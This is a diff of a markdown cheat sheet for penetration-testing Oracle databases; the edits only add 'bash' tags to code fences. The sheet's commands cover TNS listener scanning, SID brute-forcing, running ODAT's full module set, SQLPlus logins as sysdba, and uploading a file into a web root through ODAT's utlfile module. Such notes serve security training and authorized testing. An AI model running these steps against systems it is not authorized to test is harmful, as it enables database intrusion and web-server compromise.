@@ -7,7 +7,7 @@
 ---
 ## Setup
 
-```
+```bash
 sudo apt-get install -y build-essential python3-dev libaio1
 wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
 tar xzf cx_Oracle-8.3.0.tar.gz && cd cx_Oracle-8.3.0
@@ -21,7 +21,7 @@ sudo pip3 install colorlog termcolor passlib python-libnmap pycryptodome
 
 Install cx_Oracle and ODAT with all required dependencies.
 
-```
+```bash
 ./odat.py -h
 ```
 
@@ -30,19 +30,19 @@ Verify ODAT installed correctly.
 ---
 ## Enumeration
 
-```
+```bash
 sudo nmap -p1521 -sV --open <target>
 ```
 
 Scan for Oracle TNS listener and retrieve version info.
 
-```
+```bash
 sudo nmap -p1521 -sV --open --script oracle-sid-brute <target>
 ```
 
 Brute-force valid SIDs on the target. SIDs are required before authentication.
 
-```
+```bash
 ./odat.py all -s <target>
 ```
 
@@ -51,13 +51,13 @@ Run all ODAT modules against the target. Returns database names, versions, runni
 ---
 ## Connection
 
-```
+```bash
 sqlplus <user>/<password>@<target>/<SID>
 ```
 
 Connect to the Oracle database using SQLPlus.
 
-```
+```bash
 sqlplus <user>/<password>@<target>/<SID> as sysdba
 ```
 
@@ -82,14 +82,14 @@ Default web root paths by OS:
 |Linux|`/var/www/html`|
 |Windows|`C:\inetpub\wwwroot`|
 
-```
+```bash
 echo "Oracle File Upload Test" > testing.txt
 ./odat.py utlfile -s <target> -d <SID> -U <user> -P <password> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
 ```
 
 Upload a file to the web root using ODAT's `utlfile` module. Requires SYSDBA and a running web server.
 
-```
+```bash
 curl -X GET http://<target>/testing.txt
 ```
 
